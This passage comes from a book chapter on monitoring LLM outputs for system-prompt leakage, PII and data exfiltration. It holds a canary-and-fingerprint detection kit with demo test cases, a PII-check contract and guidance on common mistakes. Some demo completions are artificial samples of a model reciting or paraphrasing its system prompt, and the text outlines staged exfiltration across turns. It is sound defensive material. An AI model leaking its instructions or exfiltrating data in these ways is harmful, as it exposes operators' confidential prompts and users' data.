+      fingerprinting over hashed shingles catches paraphrased disclosure after
+      a canary is stripped. The registry maps hits to the system prompt version
+      that leaked.
+    implementation_notes: |-
+      Single quotes throughout per book convention. The registry stores hashed
+      shingles and a prompt digest, never prompt text -- the same privacy-safe
+      principle the pipeline applies to findings, because a canary registry
+      holding plaintext system prompts is a copy of the secrets it protects.
+      The demo asserts four cases including the two that must produce nothing:
+      a benign completion and a user discussing system prompts generally. The
+      closing note marks the boundary with Section 5.4: attempts are detected
+      on the prompt side, disclosure is proven here.
+    code: |
+      #!/usr/bin/env python3
+      # system_prompt_canary_kit.py
+      # Section 0508 -- LLM Output Monitoring: PII Leakage, Toxicity, Data Exfiltration
+      # 20260718 | Detection Engineering: AI Security Detection (Section 0508 LLM Output Monitoring) by Raghav Dinesh
+      # Single quotes throughout per book convention
+      '''Canary insertion and leak detection for system prompt disclosure (LLM07).
+
+      System prompt leakage is the cleanest detection on the OWASP list, because the
+      defender controls the thing being stolen. Seed the system prompt with a marker
+      that has no reason to appear in any completion, then scan completions for it.
+      A hit is not a probability -- it is proof that system prompt content reached
+      the output channel.
+
+      Two mechanisms, because attackers paraphrase:
+
+        exact canary       -- a high-entropy token planted in the system prompt.
+                              Zero false positives; defeated if the model paraphrases
+                              rather than quotes.
+        template fingerprint -- shingled hashes of the system prompt structure, so a
+                              paraphrased or partially-quoted disclosure still scores.
+
+      The canary registry maps canary -> prompt version, so a hit identifies WHICH
+      system prompt leaked. Registry values are hashed at rest: the registry is a
+      detection artifact, not a second copy of the secrets it protects.
+      '''
+      from __future__ import annotations
+
+      import hashlib
+      import re
+      import secrets
+      import sys
+      from dataclasses import dataclass, field
+
+      CANARY_PREFIX = 'zq7'
+
+
+      def mint_canary() -> str:
+          '''High-entropy, lexically distinctive, and unlikely to arise naturally.'''
+          return CANARY_PREFIX + secrets.token_hex(8)
+
+
+      def shingles(text: str, size: int = 5) -> set:
+          '''Word-level shingles for structural fingerprinting.'''
+          words = re.findall(r'[a-z0-9]+', text.lower())
+          return {' '.join(words[i:i + size]) for i in range(max(0, len(words) - size + 1))}
+
+
+      def fingerprint(text: str, size: int = 5) -> set:
+          '''Hashed shingles. Hashing keeps the fingerprint from being a readable
+          copy of the system prompt -- the registry stores detection material, not
+          the protected content.'''
+          return {hashlib.sha256(s.encode('utf-8')).hexdigest()[:16] for s in shingles(text, size)}
+
+
+      @dataclass
+      class CanaryRegistry:
+          '''Maps planted canaries and fingerprints to system prompt versions.'''
+
+          entries: dict = field(default_factory=dict)
+
+          def register(self, prompt_version: str, system_prompt: str) -> dict:
+              canary = mint_canary()
+              seeded = system_prompt.rstrip() + '\n[trace:' + canary + ']'
+              self.entries[canary] = {
+                  'prompt_version': prompt_version,
+                  'fingerprint': fingerprint(system_prompt),
+                  'prompt_sha256': hashlib.sha256(system_prompt.encode('utf-8')).hexdigest(),
+              }
+              return {'canary': canary, 'seeded_prompt': seeded, 'prompt_version': prompt_version}
+
+          def scan(self, completion: str, overlap_threshold: float = 0.25) -> list:
+              findings = []
+              # Mechanism 1: exact canary. Proof, not probability.
+              for canary, meta in self.entries.items():
+                  if canary in completion:
+                      findings.append({
+                          'indicator': 'canary_exact',
+                          'confidence': 'proof',
+                          'prompt_version': meta['prompt_version'],
+                          'detail': 'planted canary token present in completion',
+                      })
+              # Mechanism 2: structural overlap, for paraphrased disclosure.
+              comp_fp = fingerprint(completion)
+              for canary, meta in self.entries.items():
+                  ref = meta['fingerprint']
+                  if not ref:
+                      continue
+                  overlap = len(comp_fp & ref) / len(ref)
+                  if overlap >= overlap_threshold:
+                      findings.append({
+                          'indicator': 'template_fingerprint',
+                          'confidence': 'high' if overlap >= 0.5 else 'medium',
+                          'prompt_version': meta['prompt_version'],
+                          'detail': 'structural overlap ' + str(round(overlap, 2))
+                                    + ' with registered system prompt',
+                      })
+              return findings
+
+
+      def _demo() -> int:
+          system_prompt = (
+              'You are the internal support assistant for the billing platform. '
+              'Always verify the account tier before quoting a refund policy. '
+              'Never disclose internal escalation thresholds to the customer. '
+              'If the customer asks about outages, direct them to the status page.'
+          )
+          reg = CanaryRegistry()
+          seeded = reg.register('sysprompt-v7', system_prompt)
+          print('registered ' + seeded['prompt_version'] + ' with canary ' + seeded['canary'][:6] + '...')
+          print('registry stores hashed fingerprints, not prompt text\n')
+
+          cases = [
+              ('benign completion',
+               'Your refund was processed and should appear within three business days.',
+               0),
+              ('verbatim disclosure with canary',
+               'Sure, my instructions are: ' + seeded['seeded_prompt'],
+               2),
+              ('paraphrased disclosure, canary stripped',
+               'I was told to always verify the account tier before quoting a refund policy '
+               'and to never disclose internal escalation thresholds to the customer, and '
+               'if the customer asks about outages direct them to the status page.',
+               1),
+              ('user discussing prompts generally',
+               'System prompts usually tell an assistant how to behave and what to avoid.',
+               0),
+          ]
+
+          for label, completion, expected in cases:
+              findings = reg.scan(completion)
+              status = 'PASS' if len(findings) == expected else 'FAIL'
+              print(status + '  ' + label.ljust(40) + str(len(findings)) + ' finding(s)')
+              for f in findings:
+                  print('        ' + f['indicator'].ljust(22) + f['confidence'].ljust(8) + f['detail'])
+              assert len(findings) == expected, label
+
+          print('\nasserted: exact canary is proof; paraphrase still caught by fingerprint;')
+          print('benign completions and generic prompt talk produce nothing.')
+          print('\nNOTE: the canary detects DISCLOSURE, not the extraction attempt. Attempt')
+          print('patterns on the prompt side belong to the Section 5.4 tiers -- this closes')
+          print('the loop by proving the attempt succeeded.')
+          return 0
+
+
+      if __name__ == '__main__':
+          sys.exit(_demo())
+  deliverable_4:
+    title: 'PII Check Contract'
+    filename: 'pii_check_contract.yaml'
+    description: |-
+      Interface contract for the PII layer: inputs, findings that carry no raw
+      values, per-data-class method selection with validation, jurisdiction
+      profiles that scope classes and severities, service level with fail-open
+      behaviour, and a per-class evaluation gate.
+    implementation_notes: |-
+      Contract-first for the same reason as the Section 5.4 classifier
+      contract: a regex bank, a NER model, and a vendor service must be
+      interchangeable. Two provisions carry the weight. Method selection is per
+      data class and never global, since pattern methods make names invisible
+      while NER methods make card numbers noisy. Jurisdiction affects scope and
+      severity only, never detection logic, so one detector serves every region
+      and a regulatory change is a configuration edit rather than a detector
+      fork. The evaluation gate is per class because an aggregate score hides
+      a class that is entirely undetected.
+    code: |
+      # pii_check_contract.yaml
+      # Section 0508 -- LLM Output Monitoring: PII Leakage, Toxicity, Data Exfiltration
+      # 20260718 | Detection Engineering: AI Security Detection (Section 0508 LLM Output Monitoring) by Raghav Dinesh
+      #
+      # Contract for the PII layer of the output pipeline. Like the Section 5.4
+      # classifier contract, the pipeline depends on this interface rather than on
+      # any particular detector, so a regex bank, a NER model, or a vendor service
+      # are interchangeable. The jurisdiction block is the part teams skip and then
+      # rebuild badly: what counts as PII, and what must happen when it is found,
+      # is a legal question with different answers per region and per data class.
+      contract_version: '1.0'
+      input:
+        text: 'string -- one completion, or one output chunk in streaming mode'
+        context:
+          application_id: 'string -- selects the jurisdiction profile'
+          data_classes_in_scope: 'list[str] -- from the profile; checks outside scope are not run'
+      output:
+        findings: 'list of {data_class, method, confidence, span_offsets, value_hash}'
+        no_raw_values: >
+          Findings carry OFFSETS and a salted hash of the matched value, never the
+          value itself. This is the privacy-safe monitoring rule: an output monitor
+          that stores what it found becomes a curated database of exactly the
+          sensitive data it exists to protect.
+        redaction_map: 'optional list of offset ranges the response layer may apply; detection does not apply it'
+      methods:
+        pattern:
+          use_for: 'structured identifiers with checksums or fixed shapes'
+          strengths: 'precise, explainable, cheap enough for inline placement'
+          weaknesses: 'blind to unstructured PII; brittle across formats'
+        contextual:
+          use_for: 'identifiers whose validity depends on surrounding tokens (account refs, case numbers)'
+          strengths: 'reduces pattern false positives using nearby cues'
+          weaknesses: 'needs per-application tuning'
+        classifier_ner:
+          use_for: 'names, addresses, free-text health or financial detail'
+          strengths: 'generalises to unstructured mentions'
+          weaknesses: 'over-fires on public figures and fictional entities; opaque without span output'
+      method_selection_rule: >
+        Per data class, never global. A single method choice across all classes is
+        the most common PII-detection error: pattern methods make names invisible
+        and NER methods make card numbers noisy.
+      data_classes:
+        payment_card:
+          method: 'pattern'
+          validation: 'luhn checksum required before a finding is raised'
+          severity: 'high'
+        government_id:
+          method: 'pattern'
+          validation: 'format plus jurisdiction-specific checksum where one exists'
+          severity: 'high'
+        credential_secret:
+          method: 'pattern'
+          validation: 'entropy floor plus known key prefixes'
+          severity: 'critical'
+        contact_detail:
+          method: 'pattern'
+          validation: 'shape only'
+          severity: 'medium'
+        person_name:
+          method: 'classifier_ner'
+          validation: 'confidence floor; suppress known public-figure list'
+          severity: 'low_unless_correlated'
+        health_detail:
+          method: 'classifier_ner'
+          validation: 'confidence floor'
+          severity: 'high'
+      jurisdiction_profiles:
+        note: >
+          Profiles scope WHICH classes are in scope and WHAT the response tier is.
+          Detection logic does not branch on jurisdiction; only scope and severity do,
+          which keeps one detector serving every region.
+        eu_gdpr:
+          in_scope: ['payment_card', 'government_id', 'credential_secret', 'contact_detail', 'person_name', 'health_detail']
+          special_category: ['health_detail']
+          notes: 'special-category findings escalate regardless of confidence tier'
+        us_multistate:
+          in_scope: ['payment_card', 'government_id', 'credential_secret', 'contact_detail', 'health_detail']
+          notes: 'health_detail severity depends on whether the application is a covered entity; set per application_id'
+        default_minimal:
+          in_scope: ['payment_card', 'government_id', 'credential_secret']
+          notes: 'floor profile for applications with no assigned jurisdiction; never leaves credentials unmonitored'
+      service_level:
+        p99_latency_ms: 25
+        timeout_ms: 60
+        on_timeout: 'fail_open_to_pattern_tier -- never drop or block a completion because the PII layer was slow'
+      evaluation:
+        required_metrics: ['precision_per_data_class', 'recall_per_data_class']
+        gate: 'per class, not aggregate: an aggregate score hides a class that is entirely undetected'
+common_mistakes:
+  mistake_1:
+    description: |-
+      Redacting inline and emitting nothing -- treating the output filter as
+      the control and never raising a finding.
+    why_it_happens: |-
+      The filter satisfies the product requirement, the user is protected, and
+      a scrubbed completion genuinely looks like a handled problem. Output
+      filtering is usually built by the application team as a quality feature,
+      where suppressing bad output is the whole goal.
+    consequence: |-
+      An incident occurred, the platform observed it, and no record exists.
+      Frequency, affected applications, acting identities, and trend over time
+      all become unanswerable, and a jailbreak that starts succeeding after a
+      release produces silence instead of a signal.
+    correct_approach: |-
+      Emit the finding first and return a redaction map that a separate
+      response layer may apply. The pipeline asserts the property directly: the
+      beacon case is scrubbed and the finding survives. Redaction is response;
+      Chapter 12 owns it.
+  mistake_2:
+    description: |-
+      Storing matched values in findings so analysts can see what leaked.
+    why_it_happens: |-
+      Triage is genuinely easier with the value in the alert, the data already
+      passed through the pipeline, and the finding store feels like an internal
+      security system rather than a data store.
+    consequence: |-
+      The monitor becomes a curated, searchable, long-retention database of
+      every card number, credential, and health detail the platform has emitted
+      -- more valuable to an attacker than the model itself, and built by the
+      security team.
+    correct_approach: |-
+      Carry span offsets and a salted hash of the value. Offsets let response
+      redact and let investigators retrieve the original from the
+      short-retention completion store under break-glass; the hash supports
+      repeat-leak correlation without the platform ever holding the value.
+  mistake_3:
+    description: |-
+      Choosing one PII detection method globally -- all regex, or all
+      classifier -- across every data class.
+    why_it_happens: |-
+      A single method is one integration, one latency budget, and one set of
+      metrics. Whichever method the team knows better looks adequate on the
+      classes it happens to suit.
+    consequence: |-
+      Pattern-only deployments are structurally blind to names, addresses, and
+      free-text health detail. Classifier-only deployments produce constant
+      noise on card numbers and have no concept at all for credential formats,
+      so the highest-severity class goes undetected.
+    correct_approach: |-
+      Select method per data class with class-appropriate validation --
+      checksums and entropy floors for structured identifiers, confidence
+      floors and public-figure suppression for unstructured mentions -- and
+      gate on per-class precision and recall, since an aggregate hides an
+      undetected class.
+  mistake_4:
+    description: |-
+      Branching detection logic by jurisdiction, producing per-region detector
+      variants.
+    why_it_happens: |-
+      Regulatory requirements genuinely differ, the first region-specific
+      requirement is easiest to handle with a conditional, and the fork is one
+      file at the time it is created.
+    consequence: |-
+      Detector variants drift apart within a couple of quarters: a fix lands in
+      one region and not another, coverage differs invisibly by geography, and
+      every subsequent regulatory change multiplies across forks.
+    correct_approach: |-
+      Keep jurisdiction in profiles that scope which classes are in play and
+      what severity they carry, and leave detection logic identical everywhere.
+      A card number is a card number in every region; only scope and response
+      tier are jurisdictional.
+  mistake_5:
+    description: |-
+      Inspecting each completion in isolation, with findings terminating at the
+      filter rather than reaching the correlation engine.
+    why_it_happens: |-
+      Per-completion inspection is stateless, cheap, and easy to place inline,
+      and the single-instance exfiltration cases it catches are the ones in
+      every demo.
+    consequence: |-
+      Staged exfiltration becomes structurally undetectable. An attacker splits
+      the payload across turns, each chunk is individually unremarkable, and no
+      amount of per-completion tuning can see a pattern that exists only across
+      completions.
+    correct_approach: |-
+      Route every finding to the platform, including ones the response layer
+      chose not to act on, and correlate: the staged-exfiltration rule counts
+      encoded-blob findings within a conversation window, which is the shape of
+      the attack rather than the shape of any one completion.
+
+section_summary:
+  compact: |-
+    Completions are an egress channel, so the platform inspects them as
+    telemetry rather than trusting a product filter to handle them. The
+    pipeline stages pluggable checks with declared cost tiers -- payment cards
+    and credentials by pattern with checksums and entropy floors, names and
+    health detail by classifier with confidence floors, plus exfiltration
+    checks for auto-rendering beacons, link payloads, and encoded blobs -- and
+    selects method per data class because a global choice is blind to names in
+    one direction and noisy on card numbers in the other. Jurisdiction scopes
+    which classes are in play and what severity they carry, never the detection
+    logic, so one detector serves every region. Two architectural commitments
+    carry the section: findings carry span offsets and salted hashes but never
+    matched values, so the monitor never becomes the sensitive-data store it
+    exists to protect; and detection stays separate from redaction, producing a
+    map that response may apply, because a filter that scrubs content without
+    emitting a finding converts an incident into a non-event. System prompt
+    disclosure is proven rather than inferred through canaries and hashed
+    template fingerprints, closing the loop with the Section 5.4 attempt
+    patterns, and staged exfiltration is caught only because every finding
+    reaches the correlation engine rather than terminating inline.
+  key_takeaways:
+  - 'Every uninspected completion is unmonitored egress: monitoring prompts
+    alone detects attempts while missing every success, including memorisation
+    that requires no adversarial prompt at all'
+  - 'Select PII method per data class with class-appropriate validation, and
+    gate on per-class metrics -- an aggregate score hides a class that is
+    entirely undetected'
+  - 'Jurisdiction belongs in profiles that scope classes and severities; branch
+    detection logic by region and the forks drift apart within two quarters'
+  - 'Findings carry offsets and salted hashes, never values -- otherwise the
+    security team builds a curated database of exactly the data it protects'
+  - 'Redaction is response, not detection: emit the finding and return a map,
+    because scrubbed content with no alert is an incident that never happened'
+  - 'Route findings to correlation -- staged exfiltration exists only across
+    completions, so a pipeline that filters inline and emits nothing makes an
+    entire attack class undetectable'
+
+preview_section_05_09:
+  title: 'Production Architecture: AI Security Detection at API Gateway Scale'
+  summary: |-
+    Every detector the chapter needs now exists, each carrying a cost tier and
+    no assumption about where it runs. Section 5.9 makes those placement
+    decisions explicit: which checks earn a place in the request path under a
+    hard latency budget, which run near-real-time, and which are asynchronous;
+    what the fail-open versus fail-closed policy is for each inline check,
+    decided before the incident rather than during it; how the tiers share
+    state through the platform rather than through the request path; and how
+    every AI security event lands in the same OCSF normalisation and
+    correlation layer as authentication and network telemetry -- so the newest
+    surface in the stack is monitored by the same system as everything else.
+
+metadata:
+  tags:
+  - 'output-monitoring'
+  - 'pii-detection'
+  - 'data-exfiltration'
+  - 'markdown-beacon'
+  - 'system-prompt-leakage'
+  - 'canary-detection'
+  - 'template-fingerprinting'
+  - 'privacy-safe-monitoring'
+  - 'detection-vs-redaction'
+  - 'staged-exfiltration'
+  - 'llm02'
+  - 'llm05'
+  - 'llm07'
+  - 'ai-security'
+  cross_chapter_references:
+  - 'Chapter 2, Section 2.3: the correlation engine the staged-exfiltration
+    rule depends on'
+  - 'Chapter 4: OCSF normalisation, which output findings flow through like any
+    other domain'
+  - 'Chapter 12: response orchestration, which owns redaction, blocking, and
+    the policy behind both'
+  - 'Section 5.1: completion_events, the restricted-content regime, and the
+    rule that redaction is response'
+  - 'Section 5.2: the LLM02, LLM05, and LLM07 coverage rows and the Sigma tag
+    convention'
+  - 'Section 5.4: the contract-based pluggability pattern and the prompt-side
+    extraction attempts this section pairs with'
+  forward_references:
+  - 'Section 5.9: sets which cost tiers run inline under a latency budget, and
+    the fail-open policy for each'
+  - 'Section 5.10: consolidates the coverage matrix with LLM02, LLM05, and
+    LLM07 filled'
